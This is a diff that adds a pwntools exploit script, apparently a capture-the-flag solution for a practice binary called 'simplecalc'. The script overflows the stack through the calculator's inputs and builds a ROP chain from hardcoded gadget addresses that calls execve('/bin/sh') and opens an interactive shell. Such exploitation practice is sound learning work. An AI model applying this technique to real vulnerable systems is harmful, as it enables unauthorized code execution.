@@ -1,0 +1,63 @@
+from pwn import *
+
+# ROP but call execve("/bin/sh", 0, 0)
+# rax 0x3b, rdi = address of string "/bin/sh"
+# note: mov qword ptr [rax], rdx
+# to write the string to read-write section then take it address to rdi
+# free(0) doesnt get error
+
+p = process("./simplecalc")
+'''
+p = gdb.debug("./simplecalc", gdbscript = 
+b *main + 0xB7
+b *main + 517
+b *main + 422
+r
+)
+'''
+
+def send_data(addr):
+    val = (addr & 0xffffffff)
+    p.sendlineafter(b"=> ", b"2")
+    p.sendlineafter(b"x: ", str(val + 40).encode())
+    p.sendlineafter(b"y: ", b"40")
+    
+    val = ((addr >> 32) & 0xffffffff)
+    p.sendlineafter(b"=> ", b"2")
+    p.sendlineafter(b"x: ", str(val + 40).encode())
+    p.sendlineafter(b"y: ", b"40")
+
+
+p.sendlineafter(b"calculations: ", str(100).encode())
+for i in range(9):
+    send_data(0) # free function doesnt get error when free(0)
+
+pop_rax = 0x000000000044db34
+pop_rdi = 0x0000000000401b73
+pop_rsi = 0x0000000000401c87
+pop_rdx = 0x0000000000437a85
+syscall = 0x0000000000400488
+ret = pop_rdi + 1
+rw_section = 0x6c1000
+movGadget = 0x44526e # 0x000000000044526e : mov qword ptr [rax], rdx ; ret
+
+send_data(pop_rax)
+send_data(rw_section)
+send_data(pop_rdx)
+send_data(int.from_bytes(b"/bin/sh\x00", "little"))
+send_data(movGadget)
+send_data(pop_rdi)
+send_data(rw_section)
+send_data(pop_rax)
+send_data(0x3b)
+send_data(pop_rsi)
+send_data(0)
+send_data(pop_rdx)
+send_data(0)
+send_data(ret)
+send_data(syscall)
+
+p.sendlineafter(b"=> ", b"5")
+
+p.interactive()
+
